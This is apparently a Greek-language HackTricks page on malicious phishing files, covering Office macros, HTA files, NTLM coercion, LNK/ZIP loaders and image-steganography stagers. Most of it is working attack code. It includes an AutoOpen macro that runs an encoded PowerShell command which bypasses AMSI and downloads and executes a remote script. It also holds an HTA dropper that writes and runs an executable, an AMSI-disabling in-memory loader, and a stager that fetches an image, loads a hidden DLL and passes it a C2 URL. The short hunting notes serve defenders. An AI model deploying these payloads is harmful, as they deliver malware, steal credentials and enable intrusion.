# Αρχεία & Έγγραφα Phishing

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Microsoft Word εκτελεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων γίνεται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοιχτεί.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομάσετε το αρχείο αλλάζοντας την επέκταση και να διατηρήσετε τις δυνατότητες εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros κατά σχεδίαση, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα επεξεργαστεί από το Microsoft Word και θα είναι ικανό να εκτελέσει macros.\
Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί ισχύουν για όλα τα προγράμματα της Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελούνται από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
Αρχεία DOCX που αναφέρονται σε ένα απομακρυσμένο template (File –Options –Add-ins –Manage: Templates –Go) το οποίο περιλαμβάνει macros μπορούν επίσης να «εκτελέσουν» macros.

### Φόρτωση Εξωτερικής Εικόνας

Πήγαινε σε: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για να εκτελέσουν αυθαίρετο code από το έγγραφο.

#### Autoload functions

Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό είναι το AV να τις ανιχνεύσει.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Αφαίρεση μεταδεδομένων χειροκίνητα

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει το Document Inspector. Κάντε κλικ στο **Inspect** και στη συνέχεια **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Doc Extension

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε αυτό επειδή **can't save macro's inside a `.docx`** και υπάρχει ένα **στίγμα** γύρω από την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και μερικά web/email gateway τα μπλοκάρουν εντελώς). Επομένως, αυτή η legacy `.doc` extension είναι η καλύτερη συμβιβαστική λύση.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (such as VBScript and JScript)**. Δημιουργεί το user interface και εκτελείται ως «πλήρως αξιόπιστη» εφαρμογή, χωρίς τους περιορισμούς του μοντέλου ασφάλειας ενός browser.

Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως είναι εγκατεστημένο μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` dependent on IE**. Αν λοιπόν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM πιστοποίησης

Υπάρχουν διάφοροι τρόποι να **εξαναγκάσετε NTLM authentication "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που θα ανοίξει ο χρήστης (ακόμα και HTTP MitM?). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσει** μια **πιστοποίηση** απλώς με το **άνοιγμα του φακέλου.**

**Ελέγξτε αυτές τις ιδέες και περισσότερα στις παρακάτω σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι μπορείτε όχι μόνο να κλέψετε το hash ή την πιστοποίηση αλλά και να **εκτελέσετε NTLM relay επιθέσεις**:

- [**NTLM Relay επιθέσεις**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay σε πιστοποιητικά)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Πολύ αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα δολώματα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό δείκτη, και το .lnk το εξάγει και το εκτελεί πλήρως στη μνήμη.

Τυπική ροή που υλοποιείται από το one-liner PowerShell του .lnk:

1) Εντοπίζει το πρωτότυπο ZIP σε συνηθισμένες διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και ο γονικός φάκελος του τρέχοντος working directory.  
2) Διαβάζει τα bytes του ZIP και βρίσκει έναν σκληροκωδικοποιημένο δείκτη (π.χ., xFIQCV). Ό,τι βρίσκεται μετά τον δείκτη είναι το ενσωματωμένο PowerShell payload.  
3) Αντιγράφει το ZIP σε %ProgramData%, το εξάγει εκεί, και ανοίγει το ψεύτικο .docx για να φαίνεται νόμιμο.  
4) Παρακάμπτει το AMSI για τη τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Απο-σκοτεινοποιεί το επόμενο στάδιο (π.χ., αφαίρεση όλων των χαρακτήρων #) και το εκτελεί στη μνήμη.

Παράδειγμα σκελετού PowerShell για να εξάγει και να εκτελέσει το ενσωματωμένο στάδιο:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστα PaaS subdomains (π.χ., *.herokuapp.com) και μπορεί να περιορίζει τα payloads (σερβίρει benign ZIPs βάσει IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να μειώσει τα ίχνη στο δίσκο.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control έτσι ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινεί το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Κυνηγητό/IOCs
- ZIP files που περιέχουν το ASCII marker string (π.χ., xFIQCV) προσαρτημένο στα δεδομένα του archive.
- .lnk που απαριθμεί parent/user φακέλους για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- Παραποίηση του AMSI μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροχρόνια business threads που καταλήγουν σε links φιλοξενούμενα υπό trusted PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

Πρόσφατες αλυσίδες loader παραδίδουν έναν obfuscated JavaScript/VBS που αποκωδικοποιεί και τρέχει έναν Base64 PowerShell stager. Αυτός ο stager κατεβάζει μια εικόνα (συνήθως GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως plain text ανάμεσα σε μοναδικά start/end markers. Το script ψάχνει αυτούς τους delimiters (παραδείγματα στο wild: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το κείμενο μεταξύ, το Base64-decodes σε bytes, φορτώνει την assembly in-memory και καλεί μια γνωστή entry μέθοδο με το C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → αποκωδικοποιεί ενσωματωμένο Base64 → ξεκινάει PowerShell stager με -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → κατεβάζει εικόνα, κόβει marker-delimited Base64, φορτώνει το .NET DLL in-memory και καλεί τη μέθοδό του (π.χ., VAI) περνώντας το C2 URL και επιλογές.
- Stage 3: Ο loader ανακτά το τελικό payload και τυπικά το injectάρει μέσω process hollowing σε ένα trusted binary (συνήθως MSBuild.exe). Δείτε περισσότερα για process hollowing και trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell παράδειγμα για να carve έναν DLL από μια εικόνα και να καλέσει μια .NET μέθοδο in-memory:

<details>
<summary>Εξαγωγέας και loader PowerShell stego payload</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- Αυτό είναι ATT&CK T1027.003 (steganography/marker-hiding). Οι δείκτες διαφέρουν μεταξύ των καμπανιών.
- Το AMSI/ETW bypass και string deobfuscation εφαρμόζονται συνήθως πριν από το φόρτωμα του assembly.
- Hunting: σαρώστε τις κατεβασμένες εικόνες για γνωστά διαχωριστικά· εντοπίστε PowerShell που προσπελαύνει εικόνες και αμέσως αποκωδικοποιεί Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Μια επαναλαμβανόμενη αρχική φάση είναι ένα μικρό, έντονα obfuscated `.js` ή `.vbs` που παραδίδεται μέσα σε ένα αρχείο. Ο μοναδικός του σκοπός είναι να αποκωδικοποιήσει ένα ενσωματωμένο Base64 string και να εκκινήσει το PowerShell με `-nop -w hidden -ep bypass` για να bootstrap την επόμενη φάση μέσω HTTPS.

Βασική λογική (αφηρημένη):
- Διαβάστε τα περιεχόμενα του αρχείου
- Εντοπίστε ένα Base64 blob μεταξύ άχρηστων συμβολοσειρών
- Αποκωδικοποιήστε σε ASCII PowerShell
- Εκτελέστε με `wscript.exe`/`cscript.exe` καλώντας `powershell.exe`

Hunting cues
- Αρχειοθετημένα συνημμένα JS/VBS που εκκινούν `powershell.exe` με `-enc`/`FromBase64String` στη γραμμή εντολών.
- `wscript.exe` που εκκινεί `powershell.exe -nop -w hidden` από προσωρινούς φακέλους χρήστη.

## Windows files to steal NTLM hashes

Δείτε τη σελίδα για **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Αναφορές

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
